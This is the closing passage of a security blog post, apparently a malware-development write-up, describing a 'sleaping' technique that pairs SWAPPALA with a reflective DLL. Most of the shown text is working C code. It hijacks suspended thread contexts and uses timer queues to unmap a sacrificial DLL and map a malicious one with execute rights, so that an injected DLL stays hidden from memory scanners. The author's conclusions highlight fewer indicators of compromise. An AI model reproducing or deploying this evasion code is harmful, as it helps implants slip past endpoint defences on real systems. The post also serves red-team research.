    CONTEXT<span class="token operator">*</span> contextC <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> contextD <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    HANDLE ThreadArray<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

    context<span class="token operator">-&gt;</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>
    contextB<span class="token operator">-&gt;</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>
    contextC<span class="token operator">-&gt;</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>
    contextD<span class="token operator">-&gt;</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>

    <span class="token comment">// Create a thread to control</span>
    ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_SUSPENDED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_SUSPENDED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_SUSPENDED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_SUSPENDED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unmap</span>
    <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextB<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapex</span>
    <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextC<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unmap</span>
    <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapex</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ImageBaseDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>sacDllHandle<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FILE_MAP_ALL_ACCESS<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span> <span class="token comment">//the offset must be either hex 28 or int 40</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>ImageBaseDLL<span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextC<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextC<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextC<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ImageBaseDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>malDllHandle<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FILE_MAP_ALL_ACCESS <span class="token operator">|</span> FILE_MAP_EXECUTE<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span> <span class="token comment">//the offset must be either hex 28 or int 40</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>ImageBaseDLL<span class="token punctuation">;</span>

    <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextB<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextC<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextD<span class="token punctuation">)</span><span class="token punctuation">;</span>

    HANDLE  hTimerQueue <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    HANDLE  hNewTimer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    PVOID ResumeThreadAddress <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    hTimerQueue <span class="token operator">=</span> <span class="token function">CreateTimerQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    ResumeThreadAddress <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ResumeThread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>ResumeThreadAddress <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unamp</span>
        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapsac</span>
        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">7000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unmap</span>
        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">7100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapmal</span>

        <span class="token function">WaitForMultipleObjects</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> ThreadArray<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C</span></div></div></div></div><p>Ah almost forgot, bonus point: ‚ÄúResumeThread‚Äù does not need to be whitelisted in CFG, one less IOC üôÇ</p><h2 id="demo-time">Demo Time</h2><img src="https://oldboy21.github.io/sleaping/Untitled%202.png" class="center"><p>Che bello it was tough to take this screenshot. We all know how SWAPPALA reacts to memory scanners so we keep it like this for today.</p><h2 id="conclusions-and-credits">Conclusions and Credits</h2><p>We can say new in-memory sleeping technique? Maybe just different, as you wish, I hope you had fun reading this blog and learned something. Some take aways:</p><ul><li>It works with SWAPPALA, Reflective DLL hide itself in memory in a remote process</li><li>It is different, and we know how much that matters nowadays</li><li>‚Äú‚ÄùResumeThread‚Äù does not seem to be one of those functions that needs to be add in the Control Flow Guard list (i forgot it and it did not crash). So one less IOC</li><li>Each thread has its own stack, no fights anymore for more than 4 arguments</li></ul><p>Guess that‚Äôs it? Pretty far from perfect I would say so please do reach out to me if you have any ideas or just want to talk about it.</p><p>Thanks to whoever post code and resources online, Mal Dev Academy, Sektor7, open source community, Ekko, Pillo and all the people that helps brainstorming, you are golden &lt;3</p></div></article><hr><div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://oldboy21.github.io/tags/untagged/">untagged</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1887 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2024-06-04 17:34</p></div><hr><div class="sharing-buttons"><a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&amp;caption=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&amp;canonicalUrl=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr"><div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="mailto:?subject=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&amp;body=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f" target="_self" rel="noopener" aria-label="" title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></div></div></a><a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f&amp;media=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f;description=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever" target="_blank" rel="noopener" aria-label="" title="Share on pinterest"><div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f&amp;title=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&amp;summary=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&amp;source=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin"><div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></div></div></a><a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f&amp;resubmit=true&amp;title=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever" target="_blank" rel="noopener" aria-label="" title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 